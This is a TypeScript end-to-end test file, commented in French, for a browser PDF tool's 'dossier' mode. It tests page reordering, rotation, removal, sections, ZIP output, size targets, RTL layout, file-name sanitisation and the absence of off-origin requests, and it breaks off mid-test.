// Mode « dossier » (/<lang>/dossier), de bout en bout dans l'interface :
// déposer des PDF et une photo, ranger, tourner et retirer des pages,
// choisir une taille, télécharger, puis relire le fichier produit (nombre de
// pages, ordre et orientation par la couleur des pages, taille, absence de
// tout ce qui venait des originaux). docs/prd-dossier.md §11.3.
//
// Fichier nommé *.e2e.ts : lancé par `bun run test:e2e`.

import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { join } from "node:path";
import { unzipSync } from "fflate";
import { PDFDocument } from "pdf-lib";
import type { Browser, BrowserContext, Page } from "playwright-core";
import { browserName, launchBrowser, MAP_UPSERT_POLYFILL } from "./helpers/browser";
import { E2E_ORIGIN, startServer, type E2eServer } from "./helpers/server";
import { makePdf, pageJpeg, scanPdfForLeaks } from "./helpers/fixtures";
import { makeColourPdf, makeFlatPng, makePhotoPdf, makePhotoPng, makeTextPdf, type Rgb } from "./helpers/dossier-fixtures";
import {
  addFiles,
  download,
  downloadButton,
  dragTile,
  order,
  pdf,
  png,
  tile,
  tileButton,
  touchDrag,
  waitDownloadable,
  waitPages,
} from "./helpers/dossier-ui";
import { STRINGS } from "../lib/i18n";
import { imageSize } from "../lib/image-size";
import { PARTNERS_COPY } from "../lib/partners-copy";
import { SITE_COPY } from "../lib/site-copy";
import { mbToBytes } from "../lib/size-budget";

const OUT_DIR = join(import.meta.dir, "..", "out");
const en = STRINGS.en;
const d = en.dossier;

const RED: Rgb = [220, 30, 30];
const GREEN: Rgb = [30, 170, 60];
const BLUE: Rgb = [30, 60, 200];
const YELLOW: Rgb = [230, 210, 40];
const MAGENTA: Rgb = [200, 40, 200];

let server: E2eServer;
let browser: Browser;
let context: BrowserContext | undefined;
let requests: string[] = [];

beforeAll(async () => {
  server = startServer(OUT_DIR);
  browser = await launchBrowser();
});

afterAll(async () => {
  await browser?.close();
  server?.stop();
});

afterEach(async () => {
  for (const page of context?.pages() ?? []) await page.goto("about:blank").catch(() => {});
  await context?.close();
  context = undefined;
});

async function openPage(path: string, options?: Parameters<Browser["newContext"]>[0]) {
  context = await browser.newContext({ serviceWorkers: "block", viewport: { width: 1440, height: 1000 }, ...options });
  await context.addInitScript(MAP_UPSERT_POLYFILL);
  requests = [];
  context.on("request", (r) => requests.push(r.url()));
  const page = await context.newPage();
  page.on("pageerror", (e) => console.error("[page]", e.message));
  await page.goto(`${E2E_ORIGIN}${path}`);
  return page;
}

/** Deux PDF de deux pages (rouge, vert ; bleu, jaune) et une « photo » magenta en paysage. */
async function threeFiles() {
  return [
    pdf("a.pdf", await makeColourPdf([RED, GREEN])),
    pdf("b.pdf", await makeColourPdf([BLUE, YELLOW])),
    png("photo.png", makeFlatPng(800, 600, MAGENTA)),
  ];
}

/** Couleur moyenne du centre d'une image (décodée dans la page). */
function centreColour(page: Page, image: Uint8Array) {
  return page.evaluate(async (b64) => {
    const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
    const bmp = await createImageBitmap(new Blob([bytes]));
    const c = document.createElement("canvas");
    c.width = bmp.width;
    c.height = bmp.height;
    const ctx = c.getContext("2d")!;
    ctx.drawImage(bmp, 0, 0);
    const data = ctx.getImageData(Math.round(bmp.width * 0.3), Math.round(bmp.height * 0.3), Math.round(bmp.width * 0.4), Math.round(bmp.height * 0.4)).data;
    const sum = [0, 0, 0];
    for (let i = 0; i < data.length; i += 4) for (let k = 0; k < 3; k++) sum[k] += data[i + k];
    return sum.map((s) => s / (data.length / 4));
  }, Buffer.from(image).toString("base64"));
}

const COLOURS: Record<string, Rgb> = { red: RED, green: GREEN, blue: BLUE, yellow: YELLOW, magenta: MAGENTA };
/** Nom de la couleur de chaque page d'un PDF produit, dans l'ordre. */
async function pageColours(page: Page, bytes: Uint8Array) {
  const count = (await PDFDocument.load(bytes)).getPageCount();
  const out: string[] = [];
  for (let i = 0; i < count; i++) {
    const mean = await centreColour(page, await pageJpeg(bytes, i));
    const name = Object.entries(COLOURS).find(([, c]) => c.every((v, k) => Math.abs(v - mean[k]) < 35))?.[0];
    out.push(name ?? `?(${mean.map(Math.round).join(",")})`);
  }
  return out;
}
const pageSizes = async (bytes: Uint8Array) => (await PDFDocument.load(bytes)).getPages().map((p) => [Math.round(p.getWidth()), Math.round(p.getHeight())]);

/** Attend que les intertitres de section portent exactement ces noms, dans cet ordre. */
const sectionNames = (page: Page, names: string[]) =>
  page.waitForFunction(
    (want) =>
      JSON.stringify([...document.querySelectorAll<HTMLInputElement>('[data-testid="section-header"] input')].map((el) => el.value)) === want,
    JSON.stringify(names)
  );

const sizeRadio = (page: Page, label: string) => page.getByTestId("size-panel").getByRole("radio", { name: label, exact: true });
const offOrigin = () => requests.filter((u) => !u.startsWith(`${E2E_ORIGIN}/`) && !u.startsWith("blob:") && !u.startsWith("data:"));

describe("dossier : parcours complet", () => {
  test(
    "ordinateur : 2 PDF et une photo → photo en tête, une page tournée, une page retirée, 2 Mo → un PDF dans cet ordre, sans rien des originaux",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, await threeFiles());
      await waitPages(page, 5);
      expect(await order(page)).toEqual(["a.pdf#0", "a.pdf#1", "b.pdf#0", "b.pdf#1", "photo.png#0"]);
      // La liste donne le nombre de pages de chaque fichier, et le total.
      await page.getByTestId("dossier-total").filter({ hasText: d.grid.total(5) }).waitFor();

      // La photo passe en tête, d'un document à l'autre.
      await dragTile(page, 4, 0, "before");
      expect(await order(page)).toEqual(["photo.png#0", "a.pdf#0", "a.pdf#1", "b.pdf#0", "b.pdf#1"]);

      // La page rouge (2e) tournée d'un quart de tour ; la page jaune (5e) retirée.
      await tile(page, 1).getByRole("button", { name: `${d.grid.rotate} 2`, exact: true }).click();
      expect(await tile(page, 1).getAttribute("data-rotate")).toBe("90");
      await tile(page, 4).getByRole("button", { name: `${d.grid.remove} 5`, exact: true }).click();
      await page.getByTestId("page-undo").filter({ hasText: d.grid.removed(5) }).waitFor();
      await waitPages(page, 4);

      await sizeRadio(page, en.size.mb(2)).click();
      await page.getByTestId("size-estimate").filter({ hasText: en.size.mb(2) }).waitFor();
      expect(await page.getByTestId("size-panel").getAttribute("data-fit")).toBe("fits");

      const file = await download(page, d.download);
      expect(file.name).toBe(`${d.defaultName}.pdf`);
      expect(file.bytes.length).toBeLessThanOrEqual(mbToBytes(2));
      expect(await pageColours(page, file.bytes)).toEqual(["magenta", "red", "green", "blue"]);
      // La page tournée est réellement en paysage ; les autres gardent leur format.
      const sizes = await pageSizes(file.bytes);
      expect(sizes[1]).toEqual([400, 300]);
      expect(sizes[2]).toEqual([300, 400]);
      expect(sizes[0][0]).toBeGreaterThan(sizes[0][1]);

      // Rien des originaux : ni texte, ni métadonnées, ni police.
      const leaks = await scanPdfForLeaks(file.bytes);
      expect(leaks.markerHits).toBe(0);
      expect(leaks.keys).toEqual([]);

      // Empreinte du fichier produit, comme en mode signer.
      const hash = await page.getByTestId("fingerprint").locator("code").getAttribute("data-hash");
      expect(hash).toBe(createHash("sha256").update(file.bytes).digest("hex"));

      // Aucune requête hors de l'origine pendant tout le parcours.
      expect(offOrigin()).toEqual([]);
    },
    180_000
  );

  test(
    "clavier seul : Alt + flèches pour déplacer, R pour tourner, Suppr pour retirer, Annuler, puis télécharger",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, await threeFiles());
      await waitPages(page, 5);

      await tileButton(page, 0).focus();
      await page.keyboard.press("Alt+ArrowRight");
      expect(await order(page)).toEqual(["a.pdf#1", "a.pdf#0", "b.pdf#0", "b.pdf#1", "photo.png#0"]);
      // Le focus a suivi la page déplacée.
      expect(await page.evaluate(() => (document.activeElement?.closest("[data-page-index]") as HTMLElement | null)?.dataset.pageIndex)).toBe("1");
      await page.keyboard.press("Alt+ArrowLeft");
      expect(await order(page)).toEqual(["a.pdf#0", "a.pdf#1", "b.pdf#0", "b.pdf#1", "photo.png#0"]);

      // Flèches seules : le focus se déplace, pas la page.
      await page.keyboard.press("ArrowRight");
      await page.keyboard.press("ArrowRight");
      expect(await page.evaluate(() => (document.activeElement?.closest("[data-page-index]") as HTMLElement | null)?.dataset.pageIndex)).toBe("2");
      await page.keyboard.press("r");
      expect(await tile(page, 2).getAttribute("data-rotate")).toBe("90");
      for (let i = 0; i < 3; i++) await page.keyboard.press("r");
      expect(await tile(page, 2).getAttribute("data-rotate")).toBe("0");
      await page.keyboard.press("r");

      await page.keyboard.press("End");
      await page.keyboard.press("Delete");
      await waitPages(page, 4);
      expect(await order(page)).toEqual(["a.pdf#0", "a.pdf#1", "b.pdf#0", "b.pdf#1"]);
      // Annuler : la page revient à sa place.
      const undo = page.getByTestId("page-undo").getByRole("button", { name: d.grid.undo });
      await undo.focus();
      await page.keyboard.press("Enter");
      await waitPages(page, 5);
      expect(await order(page)).toEqual(["a.pdf#0", "a.pdf#1", "b.pdf#0", "b.pdf#1", "photo.png#0"]);
      await page.getByTestId("page-undo").waitFor({ state: "detached" });

      await tileButton(page, 1).focus();
      await page.keyboard.press("Backspace");
      await waitPages(page, 4);

      await waitDownloadable(page, d.download);
      await downloadButton(page, d.download).first().focus();
      const [file] = await Promise.all([page.waitForEvent("download", { timeout: 60_000 }), page.keyboard.press("Enter")]);
      const { readFileSync } = await import("node:fs");
      const bytes = new Uint8Array(readFileSync((await file.path())!));
      expect(await pageColours(page, bytes)).toEqual(["red", "blue", "yellow", "magenta"]);
      expect((await pageSizes(bytes))[1]).toEqual([400, 300]);
    },
    180_000
  );

  test(
    "téléphone (390 × 844) : deux colonnes, appui long pour glisser, menu de la page, bouton du bas à chaque étape",
    async () => {
      const page = await openPage("/en/dossier", { viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: browserName() !== "firefox" });
      await addFiles(page, await threeFiles());
      // Étape 1 → 2 par le bouton du bas.
      await page.getByRole("button", { name: d.next.pages, exact: true }).click();
      await waitPages(page, 5);
      expect(await page.getByTestId("page-grid").getAttribute("data-columns")).toBe("2");
      const first = (await tile(page, 0).boundingBox())!;
      const second = (await tile(page, 1).boundingBox())!;
      const third = (await tile(page, 2).boundingBox())!;
      expect(second.y).toBe(first.y);
      expect(third.y).toBeGreaterThan(first.y);

      // Un geste bref (défilement) ne déplace rien ; un appui de plus de 250 ms lance le glisser.
      await touchDrag(page, 0, 3, "after", 40);
      expect(await order(page)).toEqual(["a.pdf#0", "a.pdf#1", "b.pdf#0", "b.pdf#1", "photo.png#0"]);
      await touchDrag(page, 0, 3, "after", 400);
      expect(await order(page)).toEqual(["a.pdf#1", "b.pdf#0", "b.pdf#1", "a.pdf#0", "photo.png#0"]);

      if (browserName() === "chromium") {
        // Vrai geste tactile, par le protocole de Chromium : un balayage rapide fait
        // défiler la grille sans rien déplacer ; un appui long puis un glissement
        // déplace la page, sans que le navigateur reprenne la main pour défiler.
        const cdp = await context!.newCDPSession(page);
        const touch = (type: "touchStart" | "touchMove" | "touchEnd", p?: { x: number; y: number }) =>
          cdp.send("Input.dispatchTouchEvent", { type, touchPoints: p ? [{ x: p.x, y: p.y }] : [] });
        const centre = async (index: number, fx = 0.5) => {
          const box = (await tile(page, index).boundingBox())!;
          return { x: box.x + box.width * fx, y: box.y + box.height / 2 };
        };
        await page.getByTestId("page-grid").scrollIntoViewIfNeeded();
        const swipeFrom = await centre(2);
        await touch("touchStart", swipeFrom);
        for (let i = 1; i <= 5; i++) await touch("touchMove", { x: swipeFrom.x, y: swipeFrom.y - i * 20 });
        await touch("touchEnd");
        expect(await order(page)).toEqual(["a.pdf#1", "b.pdf#0", "b.pdf#1", "a.pdf#0", "photo.png#0"]);
        // L'élan du défilement doit être retombé : un doigt posé pendant l'élan ne fait que l'arrêter.
        await page.waitForTimeout(800);
        await page.getByTestId("page-grid").evaluate((el) => (el.scrollTop = 0));
        await page.getByTestId("page-grid").scrollIntoViewIfNeeded();

        const from = await centre(0);
        const to = await centre(1, 0.8);
        await touch("touchStart", from);
        await page.waitForTimeout(400);
        for (let i = 1; i <= 6; i++) {
          await touch("touchMove", { x: from.x + ((to.x - from.x) * i) / 6, y: from.y + ((to.y - from.y) * i) / 6 });
          await page.waitForTimeout(20);
        }
        await page.waitForTimeout(80);
        await touch("touchEnd");
        expect(await order(page)).toEqual(["b.pdf#0", "a.pdf#1", "b.pdf#1", "a.pdf#0", "photo.png#0"]);
        // Retour à l'ordre précédent, pour la suite du parcours.
        await touchDrag(page, 0, 1, "after", 400);
        expect(await order(page)).toEqual(["a.pdf#1", "b.pdf#0", "b.pdf#1", "a.pdf#0", "photo.png#0"]);
      }

      // Le menu de la page, pour qui ne glisse pas : tourner, puis « Déplacer vers… ».
      await tile(page, 4).getByRole("button", { name: d.grid.menu(5), exact: true }).tap();
      const menu = page.getByRole("dialog", { name: d.grid.menu(5) });
      await menu.getByRole("button", { name: d.grid.rotate, exact: true }).tap();
      await menu.getByLabel(d.grid.position(5, 5)).fill("1");
      await menu.getByRole("button", { name: en.size.done, exact: true }).tap();
      await menu.waitFor({ state: "detached" });
      expect(await order(page)).toEqual(["photo.png#0", "a.pdf#1", "b.pdf#0", "b.pdf#1", "a.pdf#0"]);
      expect(await tile(page, 0).getAttribute("data-rotate")).toBe("90");
      await tile(page, 1).getByRole("button", { name: d.grid.menu(2), exact: true }).tap();
      await page.getByRole("dialog", { name: d.grid.menu(2) }).getByRole("button", { name: d.grid.remove, exact: true }).tap();
      await waitPages(page, 4);

      // Étape 2 → 3, puis le téléchargement, toujours par le bouton du bas.
      await page.getByRole("button", { name: d.next.check, exact: true }).click();
      const file = await download(page, d.download);
      expect(await pageColours(page, file.bytes)).toEqual(["magenta", "blue", "yellow", "red"]);
      // La photo en paysage, tournée d'un quart de tour : en portrait.
      const sizes = await pageSizes(file.bytes);
      expect(sizes[0][1]).toBeGreaterThan(sizes[0][0]);
    },
    180_000
  );

  test(
    "arabe (/ar/dossier) : la grille se lit de droite à gauche, les flèches suivent ce que l'on voit, l'ordre du fichier est celui de la grille",
    async () => {
      const ar = STRINGS.ar;
      const page = await openPage("/ar/dossier");
      await addFiles(page, await threeFiles(), ar);
      await waitPages(page, 5, ar);
      const first = (await tile(page, 0).boundingBox())!;
      const second = (await tile(page, 1).boundingBox())!;
      expect(first.x).toBeGreaterThan(second.x);

      // Flèche gauche : la page suivante (à gauche). Alt + flèche gauche : la page avance d'un rang.
      await tileButton(page, 0).focus();
      await page.keyboard.press("ArrowLeft");
      expect(await page.evaluate(() => (document.activeElement?.closest("[data-page-index]") as HTMLElement | null)?.dataset.pageIndex)).toBe("1");
      await page.keyboard.press("Alt+ArrowLeft");
      expect(await order(page)).toEqual(["a.pdf#0", "b.pdf#0", "a.pdf#1", "b.pdf#1", "photo.png#0"]);
      // Glisser la dernière page avant la première : la moitié droite de la première vignette.
      await dragTile(page, 4, 0, "before");
      expect(await order(page)).toEqual(["photo.png#0", "a.pdf#0", "b.pdf#0", "a.pdf#1", "b.pdf#1"]);

      const file = await download(page, ar.dossier.download);
      expect(file.name).toBe(`${ar.dossier.defaultName}.pdf`);
      expect(await pageColours(page, file.bytes)).toEqual(["magenta", "red", "blue", "green", "yellow"]);
    },
    180_000
  );
});

describe("dossier : pages", () => {
  test(
    "un document dont toutes les pages sont retirées reste dans la liste, grisé, avec « Remettre ses pages »",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, await threeFiles());
      await waitPages(page, 5);
      await tile(page, 0).getByRole("button", { name: `${d.grid.remove} 1`, exact: true }).click();
      await tile(page, 0).getByRole("button", { name: `${d.grid.remove} 1`, exact: true }).click();
      await waitPages(page, 3);
      expect(await order(page)).toEqual(["b.pdf#0", "b.pdf#1", "photo.png#0"]);
      // Dans la liste des documents (l'aperçu de l'étape 3 le dit aussi, à sa façon).
      await page.getByRole("region", { name: d.step1 }).getByText(d.grid.noPages, { exact: true }).waitFor();
      // Le fichier produit ne contient plus ce document.
      const file = await download(page, d.download);
      expect(await pageColours(page, file.bytes)).toEqual(["blue", "yellow", "magenta"]);

      await page.getByRole("button", { name: d.grid.restore, exact: true }).click();
      await waitPages(page, 5);
      await page.getByText(d.grid.noPages, { exact: true }).waitFor({ state: "detached" });
      expect((await order(page)).filter((p) => p.startsWith("a.pdf"))).toEqual(["a.pdf#0", "a.pdf#1"]);

      // « Rétablir l'ordre d'origine » : les fichiers dans l'ordre, page après page.
      await dragTile(page, 0, 4, "after");
      await page.getByRole("button", { name: d.grid.reset, exact: true }).click();
      expect(await order(page)).toEqual(["a.pdf#0", "a.pdf#1", "b.pdf#0", "b.pdf#1", "photo.png#0"]);
    },
    180_000
  );

  test(
    "retirer un fichier à l'étape 1 retire ses pages ; les retouches des autres restent",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, await threeFiles());
      await waitPages(page, 5);
      await tile(page, 2).getByRole("button", { name: `${d.grid.rotate} 3`, exact: true }).click();
      await dragTile(page, 4, 0, "before");
      await page.getByRole("button", { name: en.remove("a.pdf"), exact: true }).click();
      await waitPages(page, 3);
      expect(await order(page)).toEqual(["photo.png#0", "b.pdf#0", "b.pdf#1"]);
      expect(await tile(page, 1).getAttribute("data-rotate")).toBe("90");
    },
    120_000
  );

  test(
    "tourner une page retire ses zones masquées, et le dit",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, [pdf("a.pdf", await makeColourPdf([RED, GREEN]))]);
      await waitPages(page, 2);
      // Un masque sur la première page, par l'outil commun « Masquer quelque chose ».
      await page.getByRole("button", { name: en.tools.hide, exact: true }).click();
      const surface = page.getByRole("application", { name: en.mask.surface(1) });
      await surface.evaluate((el) => el.scrollIntoView({ block: "start" }));
      const box = (await surface.boundingBox())!;
      await page.mouse.move(box.x + box.width * 0.2, box.y + box.height * 0.2);
      await page.mouse.down();
      await page.mouse.move(box.x + box.width * 0.6, box.y + box.height * 0.4, { steps: 5 });
      await page.mouse.up();
      await page.getByRole("button", { name: en.mask.done, exact: true }).click();
      await page.getByRole("button", { name: en.tools.hidden(1), exact: true }).waitFor({ timeout: 60_000 });

      await tile(page, 0).getByRole("button", { name: `${d.grid.rotate} 1`, exact: true }).click();
      await page.getByText(d.grid.rotateClearsMasks, { exact: true }).waitFor();
      await page.getByRole("button", { name: en.tools.hide, exact: true }).waitFor({ timeout: 60_000 });
      // Tourner l'autre page ne touche à rien d'autre.
      await tile(page, 1).getByRole("button", { name: `${d.grid.rotate} 2`, exact: true }).click();
      await waitPages(page, 2);
      const file = await download(page, d.download);
      expect(await pageSizes(file.bytes)).toEqual([[400, 300], [400, 300]]);
      // Plus de masque : le centre de la première page est rouge.
      expect(await pageColours(page, file.bytes)).toEqual(["red", "green"]);
    },
    180_000
  );

  test(
    "fenêtrage : 150 pages, mais seules les rangées proches de l'écran sont dans la page",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, [pdf("long.pdf", await makePdf(Array.from({ length: 150 }, () => [300, 400] as [number, number])))]);
      await waitPages(page, 150);
      const mounted = () => page.locator("[data-page-index]").count();
      expect(await mounted()).toBeLessThan(80);
      expect(await tile(page, 149).count()).toBe(0);
      // Fin : la dernière page est montée, amenée à l'écran et sous le focus ; le début ne l'est plus.
      await tileButton(page, 0).focus();
      await page.keyboard.press("End");
      await tile(page, 149).waitFor();
      expect(await page.evaluate(() => (document.activeElement?.closest("[data-page-index]") as HTMLElement | null)?.dataset.pageIndex)).toBe("149");
      await page.waitForFunction(() => !document.querySelector('[data-page-index="0"]'));
      expect(await mounted()).toBeLessThan(80);
      // « Déplacer vers… » : la dernière page en tête, sans glisser sur 150 pages.
      await page.keyboard.press("Enter");
      const menu = page.getByRole("dialog", { name: d.grid.menu(150) });
      await menu.getByLabel(d.grid.position(150, 150)).fill("1");
      await menu.getByLabel(d.grid.position(150, 150)).press("Enter");
      await tile(page, 0).waitFor();
      expect(await tile(page, 0).getAttribute("data-source-page")).toBe("149");
    },
    240_000
  );
});

describe("dossier : sections et fichiers produits", () => {
  test(
    "trois sections → un ZIP de trois PDF, nommés d'après les sections, chacun sous la taille demandée",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, await threeFiles());
      await waitPages(page, 5);
      await page.getByRole("checkbox", { name: d.sections.split, exact: true }).check();
      // La première section prend tout, avec le premier nom de la liste.
      await sectionNames(page, [d.sections.presets[0]]);

      // « Nouvelle section ici », par le menu de la page.
      for (const index of [2, 4]) {
        await tile(page, index).getByRole("button", { name: d.grid.menu(index + 1), exact: true }).click();
        await page.getByRole("dialog", { name: d.grid.menu(index + 1) }).getByRole("button", { name: d.sections.add, exact: true }).click();
      }
      await sectionNames(page, d.sections.presets.slice(0, 3));
      // Un nom saisi, avec des caractères qu'un nom de fichier ne peut pas porter.
      await page.getByLabel(d.sections.name(3), { exact: true }).fill("Proof / of: address?");
      // Une page change de section par le menu : la verte rejoint la deuxième section.
      await tile(page, 1).getByRole("button", { name: d.grid.menu(2), exact: true }).click();
      await page.getByRole("dialog", { name: d.grid.menu(2) }).getByLabel(d.sections.moveTo).selectOption({ label: d.sections.presets[1] });
      expect(await order(page)).toEqual(["a.pdf#0", "b.pdf#0", "b.pdf#1", "a.pdf#1", "photo.png#0"]);

      // Le fichier à produire est passé à « Un PDF par section », la taille vaut par fichier.
      expect(await page.getByRole("radio", { name: d.output.sections, exact: true }).getAttribute("aria-checked")).toBe("true");
      await sizeRadio(page, en.size.mb(1)).click();
      await page.getByTestId("size-panel").getByText(`(${d.size.perFile})`).waitFor();
      expect(await page.getByTestId("size-files").locator("li").count()).toBe(3);

      const file = await download(page, d.downloadZip);
      expect(file.name).toBe(`${d.defaultName}.zip`);
      const zip = unzipSync(file.bytes);
      expect(Object.keys(zip).sort()).toEqual([`${d.sections.presets[0]}.pdf`, `${d.sections.presets[1]}.pdf`, "Proof of address.pdf"].sort());
      for (const bytes of Object.values(zip)) expect(bytes.length).toBeLessThanOrEqual(mbToBytes(1));
      expect(await pageColours(page, zip[`${d.sections.presets[0]}.pdf`])).toEqual(["red"]);
      expect(await pageColours(page, zip[`${d.sections.presets[1]}.pdf`])).toEqual(["blue", "yellow", "green"]);
      expect(await pageColours(page, zip["Proof of address.pdf"])).toEqual(["magenta"]);
      // Une empreinte par fichier de l'archive.
      expect(await page.getByTestId("fingerprint").locator("code").count()).toBe(3);
    },
    180_000
  );

  test(
    "glisser une page d'une section à l'autre, retirer une section, section vide sans fichier",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, [pdf("a.pdf", await makeColourPdf([RED, GREEN])), pdf("b.pdf", await makeColourPdf([BLUE, YELLOW]))]);
      await waitPages(page, 4);
      await page.getByRole("checkbox", { name: d.sections.split, exact: true }).check();
      await tile(page, 2).getByRole("button", { name: d.grid.menu(3), exact: true }).click();
      await page.getByRole("dialog", { name: d.grid.menu(3) }).getByRole("button", { name: d.sections.add, exact: true }).click();
      await page.getByTestId("section-header").nth(1).waitFor();
      // La page rouge glissée sur la page jaune : elle change de section.
      await dragTile(page, 0, 3, "after");
      expect(await order(page)).toEqual(["a.pdf#1", "b.pdf#0", "b.pdf#1", "a.pdf#0"]);
      expect(await tile(page, 3).getAttribute("data-section")).toBe(await tile(page, 1).getAttribute("data-section"));
      // La verte aussi : la première section est vide, elle ne produira pas de fichier.
      await dragTile(page, 0, 1, "before");
      await page.getByText(d.sections.empty, { exact: true }).waitFor();
      const file = await download(page, d.download);
      // Une seule section a des pages : un seul PDF, nommé d'après elle.
      expect(file.name).toBe(`${d.sections.presets[1]}.pdf`);
      expect(await pageColours(page, file.bytes)).toEqual(["green", "blue", "yellow", "red"]);

      // Sans la deuxième section, tout revient dans la première.
      await page.getByTestId("section-header").nth(1).getByRole("button", { name: d.sections.remove, exact: true }).click();
      await page.getByTestId("section-header").nth(1).waitFor({ state: "detached" });
      await page.getByText(d.sections.empty, { exact: true }).waitFor({ state: "detached" });
    },
    180_000
  );

  test(
    "« Un PDF par document (ZIP) » : un PDF par fichier d'origine, avec les pages gardées et leurs retouches",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, await threeFiles());
      await waitPages(page, 5);
      await tile(page, 1).getByRole("button", { name: `${d.grid.remove} 2`, exact: true }).click();
      await waitPages(page, 4);
      await tile(page, 1).getByRole("button", { name: `${d.grid.rotate} 2`, exact: true }).click();
      await page.getByRole("radio", { name: d.output.separate, exact: true }).click();
      await page.getByLabel(d.fileName, { exact: true }).fill("../my-rental-file");
      const file = await download(page, d.downloadZip);
      // Nom saisi rendu sûr : aucun séparateur de chemin.
      expect(file.name).toBe("my-rental-file.zip");
      const zip = unzipSync(file.bytes);
      expect(Object.keys(zip).sort()).toEqual(["a.pdf", "b.pdf", "photo.pdf"]);
      expect(await pageColours(page, zip["a.pdf"])).toEqual(["red"]);
      expect(await pageColours(page, zip["b.pdf"])).toEqual(["blue", "yellow"]);
      expect((await pageSizes(zip["b.pdf"]))[0]).toEqual([400, 300]);
    },
    180_000
  );
});

describe("dossier : taille", () => {
  test(
    "cible intenable : le panneau le dit avant le téléchargement, avec trois issues ; le fichier produit est signalé au-dessus de la cible",
    async () => {
      const page = await openPage("/en/dossier");
      // 30 bulletins de paie : environ 160 Ko par page au premier rendu, 38 Ko au plancher de lisibilité.
      await addFiles(page, [pdf("payslips.pdf", await makeTextPdf(30))]);
      await waitPages(page, 30);
      await sizeRadio(page, en.size.mb(1)).click();
      const panel = page.getByTestId("size-panel");
      await page.getByTestId("size-estimate").filter({ hasText: d.size.unreachable(en.size.mb(1)) }).waitFor();
      expect(await panel.getAttribute("data-fit")).toBe("unreachable");
      const exits = page.getByTestId("size-exits").getByRole("button");
      expect(await exits.allTextContents()).toEqual(d.size.exits);

      // Le bouton reste actif : la personne décide. Le fichier sort au plancher de lisibilité.
      const file = await download(page, d.download);
      await page.getByTestId("done-notice").filter({ hasText: d.size.unreachable(en.size.mb(1)) }).waitFor();
      expect(file.bytes.length).toBeGreaterThan(mbToBytes(1));
      const doc = await PDFDocument.load(file.bytes);
      expect(doc.getPageCount()).toBe(30);
      const jpeg = imageSize(await pageJpeg(file.bytes, 0))!;
      expect(jpeg.width / (doc.getPage(0).getWidth() * 2)).toBeGreaterThan(0.54);

      // « Accepter une qualité plus faible » : la cible redevient tenable, et le fichier passe dessous.
      await panel.getByRole("checkbox", { name: d.size.allowLow, exact: true }).check();
      await page.waitForFunction(() => document.querySelector('[data-testid="size-panel"]')?.getAttribute("data-fit") === "reduced");
      const lower = await download(page, d.download);
      expect(lower.bytes.length).toBeLessThanOrEqual(mbToBytes(1));
      await page.getByTestId("done-notice").waitFor({ state: "detached" });
      await panel.getByRole("checkbox", { name: d.size.allowLow, exact: true }).uncheck();

      // « Choisir une taille plus grande » : la taille suivante, tenable en réduisant les pages.
      await page.getByTestId("size-exits").getByRole("button", { name: d.size.exits[2], exact: true }).click();
      expect(await sizeRadio(page, en.size.mb(2)).getAttribute("aria-checked")).toBe("true");
      await page.waitForFunction(() => document.querySelector('[data-testid="size-panel"]')?.getAttribute("data-fit") === "reduced");
      const fitting = await download(page, d.download);
      expect(fitting.bytes.length).toBeLessThanOrEqual(mbToBytes(2));
      expect(fitting.bytes.length).toBeGreaterThan(mbToBytes(0.6));

      // « Séparer en plusieurs fichiers » : retour aux pages, sections activées.
      await sizeRadio(page, en.size.mb(1)).click();
      await page.getByTestId("size-exits").getByRole("button", { name: d.size.exits[0], exact: true }).click();
      expect(await page.getByRole("checkbox", { name: d.sections.split, exact: true }).isChecked()).toBe(true);
    },
    420_000
  );

  test(
    "30 pages photo sous 1 Mo : le panneau annonce « tient, pages un peu moins nettes », sans proposer de séparer, et le fichier tient",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, [pdf("scan.pdf", await makePhotoPdf(30))]);
      await waitPages(page, 30);
      await sizeRadio(page, en.size.mb(1)).click();
      const panel = page.getByTestId("size-panel");
      await page.waitForFunction(() => document.querySelector('[data-testid="size-panel"]')?.getAttribute("data-fit") === "reduced");
      await page.getByTestId("size-estimate").filter({ hasText: d.size.reduced("1.0 MB") }).waitFor();
      // Ni « impossible », ni les trois issues : rien ne pousse à séparer ou à retirer des pages.
      expect(await page.getByTestId("size-exits").count()).toBe(0);
      expect(await panel.getByText(d.size.unreachable(en.size.mb(1))).count()).toBe(0);
      const file = await download(page, d.download);
      expect(file.bytes.length).toBeLessThanOrEqual(mbToBytes(1));
      expect(await page.getByTestId("done-notice").count()).toBe(0);
      const doc = await PDFDocument.load(file.bytes);
      expect(doc.getPageCount()).toBe(30);
      // Lisible : aucune page sous le plancher (0,55 du premier rendu).
      for (const i of [0, 14, 29]) {
        const jpeg = imageSize(await pageJpeg(file.bytes, i))!;
        expect(jpeg.width / (doc.getPage(i).getWidth() * 2)).toBeGreaterThan(0.54);
      }
    },
    300_000
  );

  test(
    "« Autre… » : une taille libre entre 0,5 et 50 Mo ; un petit PDF de texte qui grossit : le panneau dit pourquoi",
    async () => {
      const page = await openPage("/en/dossier");
      // 4 pages A4 presque vides : un original de quelques Ko, des pages-images bien plus lourdes.
      await addFiles(page, [pdf("text.pdf", await makePdf(Array.from({ length: 4 }, () => [595, 842] as [number, number])))]);
      await waitPages(page, 4);
      await page.getByTestId("size-bigger").filter({ hasText: d.size.biggerWhy }).waitFor();

      await sizeRadio(page, d.size.other).click();
      const field = page.getByTestId("size-panel").getByLabel(d.size.otherLabel);
      await field.fill("1.5");
      await page.getByTestId("size-estimate").filter({ hasText: en.size.mb(1.5) }).waitFor();
      // Hors bornes : ignoré, la dernière valeur valide reste.
      await field.fill("500");
      await page.getByTestId("size-estimate").filter({ hasText: en.size.mb(1.5) }).waitFor();
      // La préférence est gardée pour la prochaine visite (affichage seulement, jamais de contenu).
      expect(await page.evaluate(() => localStorage.getItem("dossierSizeMb"))).toBe("1.5");
